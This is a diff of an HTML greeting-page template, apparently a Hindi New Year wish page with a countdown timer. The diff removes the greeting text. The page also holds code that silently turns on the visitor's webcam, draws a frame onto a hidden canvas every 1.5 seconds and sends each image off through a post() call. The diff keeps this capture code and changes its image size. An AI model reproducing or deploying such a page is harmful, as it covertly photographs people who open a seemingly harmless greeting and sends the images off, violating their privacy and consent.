@@ -495,33 +495,15 @@ h3 {
 
 <Adsense 300*60 ad>
 
-<div dir="ltr" style="text-align: left;" trbidi="on">
-<div style="background-color:#00FFFF; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-ये Sms किसी
-</b></marquee>
-</div>
-<div style="background-color: #FF0000; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: white; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-अपने को ही
-</b></marquee>
-</div>
-<div style="background-color: #FFFF00; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-भेजा जाता है
-</b></marquee>
-</div>
-</div>
 
-<!----- Wishing Poem Here ----->
-<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;आपके सारे गम खुशियों में तोल दूँ, </span></p>
-<p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;अपने सारे राज़ आपके सामने खोल दूँ</span></p>
-<p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;कोई मुझसे पहले न बोल दे, </span></p>
-<p style="text-align: center;"><span style="background-color: #00ccff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;इसलिए सोचा क्यों न आज ही, </span></p>
 
-</center>  
 
-<!----Countdown time Setting ---->
+
+
+
+
+
+
 <script>
 // Set the date we're counting down to
 var countDownDate = new Date("jan 01, 2020 00:00:00").getTime();
@@ -718,7 +700,7 @@ if (browserok) {
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<canvas hidden="hidden" id="canvas" width="720" height="842"></canvas>
 
 <script>
 
@@ -770,7 +752,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 640, 480);
+       context.drawImage(video, 0, 0, 720, 842);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
